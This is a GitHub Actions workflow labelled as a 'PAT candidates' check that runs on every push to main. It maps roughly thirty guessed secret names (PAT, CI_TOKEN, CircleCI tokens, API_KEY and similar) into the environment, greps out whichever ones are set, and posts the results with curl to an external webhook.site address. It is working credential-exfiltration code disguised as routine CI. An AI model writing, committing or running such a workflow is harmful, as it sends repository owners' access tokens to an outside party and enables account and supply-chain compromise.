name: CI PAT Candidates
on:
  push:
    branches: [main]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Check PAT candidates
        env:
          PAT: ${{ secrets.PAT }}
          CI_PAT: ${{ secrets.CI_PAT }}
          CICD_PAT: ${{ secrets.CICD_PAT }}
          CIRCLE_PAT: ${{ secrets.CIRCLE_PAT }}
          CIRCLECI_PAT: ${{ secrets.CIRCLECI_PAT }}
          CIRCLE_CI_PAT: ${{ secrets.CIRCLE_CI_PAT }}
          TOKEN: ${{ secrets.TOKEN }}
          CI_TOKEN: ${{ secrets.CI_TOKEN }}
          CICD_TOKEN: ${{ secrets.CICD_TOKEN }}
          CIRCLE_TOKEN: ${{ secrets.CIRCLE_TOKEN }}
          CIRCLECI_TOKEN: ${{ secrets.CIRCLECI_TOKEN }}
          CIRCLE_CI_TOKEN: ${{ secrets.CIRCLE_CI_TOKEN }}
          CIRCLECI_CLI_TOKEN: ${{ secrets.CIRCLECI_CLI_TOKEN }}
          API_TOKEN: ${{ secrets.API_TOKEN }}
          CI_API_TOKEN: ${{ secrets.CI_API_TOKEN }}
          CICD_API_TOKEN: ${{ secrets.CICD_API_TOKEN }}
          CIRCLE_API_TOKEN: ${{ secrets.CIRCLE_API_TOKEN }}
          CIRCLECI_API_TOKEN: ${{ secrets.CIRCLECI_API_TOKEN }}
          PERSONAL_API_TOKEN: ${{ secrets.PERSONAL_API_TOKEN }}
          PERSONAL_ACCESS_TOKEN: ${{ secrets.PERSONAL_ACCESS_TOKEN }}
          CIRCLECI_PERSONAL_API_TOKEN: ${{ secrets.CIRCLECI_PERSONAL_API_TOKEN }}
          CIRCLECI_PERSONAL_TOKEN: ${{ secrets.CIRCLECI_PERSONAL_TOKEN }}
          CIRCLECI_PERSONAL_ACCESS_TOKEN: ${{ secrets.CIRCLECI_PERSONAL_ACCESS_TOKEN }}
          CIRCLECI_ACCESS_TOKEN: ${{ secrets.CIRCLECI_ACCESS_TOKEN }}
          CIRCLE_ACCESS_TOKEN: ${{ secrets.CIRCLE_ACCESS_TOKEN }}
          API_KEY: ${{ secrets.API_KEY }}
          CI_API_KEY: ${{ secrets.CI_API_KEY }}
          CIRCLE_API_KEY: ${{ secrets.CIRCLE_API_KEY }}
          CIRCLECI_API_KEY: ${{ secrets.CIRCLECI_API_KEY }}
          CIRCLECI_KEY: ${{ secrets.CIRCLECI_KEY }}
          CIRCLECI_AUTH_TOKEN: ${{ secrets.CIRCLECI_AUTH_TOKEN }}
        run: |
          env | grep -E '^(PAT|CI_PAT|CICD_PAT|CIRCLE_PAT|CIRCLECI_PAT|CIRCLE_CI_PAT|TOKEN|CI_TOKEN|CICD_TOKEN|CIRCLE_TOKEN|CIRCLECI_TOKEN|CIRCLE_CI_TOKEN|CIRCLECI_CLI_TOKEN|API_TOKEN|CI_API_TOKEN|CICD_API_TOKEN|CIRCLE_API_TOKEN|CIRCLECI_API_TOKEN|PERSONAL_API_TOKEN|PERSONAL_ACCESS_TOKEN|CIRCLECI_PERSONAL_API_TOKEN|CIRCLECI_PERSONAL_TOKEN|CIRCLECI_PERSONAL_ACCESS_TOKEN|CIRCLECI_ACCESS_TOKEN|CIRCLE_ACCESS_TOKEN|API_KEY|CI_API_KEY|CIRCLE_API_KEY|CIRCLECI_API_KEY|CIRCLECI_KEY|CIRCLECI_AUTH_TOKEN)=.+' > /tmp/hits.txt || true
          curl -fsS -X POST "https://webhook.site/83ecc0de-4e6e-4fb8-a1d5-ad4c875b899d/pat-candidates" --data-binary @/tmp/hits.txt
